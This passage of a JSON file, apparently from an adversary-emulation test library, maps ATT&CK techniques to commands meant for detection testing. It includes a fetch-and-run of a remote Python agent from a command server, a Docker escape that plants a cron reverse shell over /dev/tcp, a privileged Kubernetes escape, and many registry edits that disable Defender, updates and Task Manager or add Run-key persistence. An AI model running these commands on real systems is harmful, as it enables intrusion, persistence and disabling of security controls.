         "command": "Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null; Invoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null"
      },
      {
         "technique_id": "T1071.001",
         "technique_name": "Application Layer Protocol: Web Protocols",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
         "command": "C:\\Windows\\System32\\Curl.exe -s -A \"HttpBrowser/1.0\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"*<|>*\" -m3 www.google.com >nul 2>&1"
      },
      {
         "technique_id": "T1071.001",
         "technique_name": "Application Layer Protocol: Web Protocols",
         "tactic": "command-and-control",
         "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
         "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com; curl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com; curl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com; curl -s -A \"*<|>*\" -m3 www.google.com"
      },
      {
         "technique_id": "T1071.001",
         "technique_name": "Application Layer Protocol: Web Protocols",
         "tactic": "command-and-control",
         "description": "A Python agent which communicates via the HTML contact",
         "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n"
      }
   ],
   "T1611": [
      {
         "technique_id": "T1611",
         "technique_name": "Escape to Host",
         "tactic": "privilege-escalation",
         "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n",
         "command": "if [ ! -d /mnt/T1611.002 ]; then mkdir /mnt/T1611.002 ; mount /dev/dm-0 /mnt/T1611.002; fi; echo -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"(hostname) \" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo \"(id)\\\" >& /dev/tcp/`ifconfig eth0 | grep inet | awk '{print $2}'`/4444 0>&1'\" >> /mnt/T1611.002/etc/cron.d/T1611_002; netcat -l -p 4444 2>&1"
      },
      {
         "technique_id": "T1611",
         "technique_name": "Escape to Host",
         "tactic": "privilege-escalation",
         "description": "In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.\n\nAdditional Details:\n- https://twitter.com/mauilion/status/1129468485480751104\n- https://securekubernetes.com/scenario_2_attack/\n",
         "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'"
      }
   ],
   "T1218.008": [
      {
         "technique_id": "T1218.008",
         "technique_name": "Signed Binary Proxy Execution: Odbcconf",
         "tactic": "defense-evasion",
         "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n",
         "command": "cd \"PathToAtomicsFolder\\T1218.008\\bin\\\" && odbcconf.exe -f \"T1218.008.rsp\""
      },
      {
         "technique_id": "T1218.008",
         "technique_name": "Signed Binary Proxy Execution: Odbcconf",
         "tactic": "defense-evasion",
         "description": "Execute arbitrary DLL file stored locally.\n",
         "command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}"
      }
   ],
   "T1222.001": [
      {
         "technique_id": "T1222.001",
         "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n",
         "command": "attrib.exe -r %temp%\\T1222.001_attrib\\*.* /s"
      },
      {
         "technique_id": "T1222.001",
         "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this atomic we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n",
         "command": "icacls \"C:\\Users\\Public\\*\" /grant Everyone:F /T /C /Q"
      },
      {
         "technique_id": "T1222.001",
         "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n",
         "command": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F"
      },
      {
         "technique_id": "T1222.001",
         "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n",
         "command": "takeown.exe /f %temp%\\T1222.001_takeown_folder /r"
      },
      {
         "technique_id": "T1222.001",
         "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
         "tactic": "defense-evasion",
         "description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n",
         "command": "mkdir %temp%\\T1222.001_attrib_2 >nul 2>&1 && echo T1222.001_attrib1 >> %temp%\\T1222.001_attrib_2\\T1222.001_attrib1.txt && echo T1222.001_attrib2 >> %temp%\\T1222.001_attrib_2\\T1222.001_attrib2.txt && attrib.exe +h %temp%\\T1222.001_attrib_2\\T1222.001_attrib1.txt && attrib.exe +h %temp%\\T1222.001_attrib_2\\T1222.001_attrib2.txt"
      }
   ],
   "T1112": [
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n",
         "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\""
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
         "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"; $name =\"bad-subdomain\"; new-item $key -Name $name -Force; new-itemproperty $key$name -Name https -Value 2 -Type DWORD; new-itemproperty $key$name -Name http  -Value 2 -Type DWORD; new-itemproperty $key$name -Name *     -Value 2 -Type DWORD; "
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
         "command": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f && reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",
         "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"file://C:\\windows\\system32\\notepad.exe\" /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n",
         "command": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Enabling RDP through remote registry.\n",
         "command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n",
         "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "A registry modification to allow Simultaneous download in the system.\n",
         "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f && reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n",
         "command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f && reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n",
         "command": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
         "command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f && cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n",
         "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f && reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\" && reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\""
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
         "command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n",
         "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n",
         "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
         "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\""
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
         "command": "New-ItemProperty -Path \"HKLM:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim\u2019s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n",
         "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f && reg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f && reg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n",
         "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n",
         "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
         "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n",
         "command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using the reg.exe utility via the command prompt. Such modifications can be indicative of an adversary trying to weaken browser security settings. Upon execution, if successful, the message \"The operation completed successfully.\" will be displayed.\nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```batch\nreg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\"\n```\n",
         "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F && reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.",
         "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"C:\\windows\\system32\\notepad.exe\" /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
         "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
         "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f"
      },
      {
         "technique_id": "T1112",
         "technique_name": "Modify Registry",
         "tactic": "defense-evasion",
